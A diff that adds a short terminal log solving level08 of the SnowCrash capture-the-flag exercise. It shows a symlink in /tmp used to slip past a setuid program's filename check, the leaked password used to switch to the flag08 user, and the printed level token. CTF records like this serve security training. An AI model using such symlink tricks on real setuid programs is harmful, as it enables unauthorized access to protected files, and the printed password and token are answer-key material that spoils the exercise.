@@ -1,0 +1,8 @@
+level08@SnowCrash:~$ ln -sfi /home/user/level08/token /tmp/qwerty
+level08@SnowCrash:~$ ./level08 /tmp/qwerty
+quif5eloekouj29ke0vouxean
+level08@SnowCrash:~$ su flag08
+Password: 
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
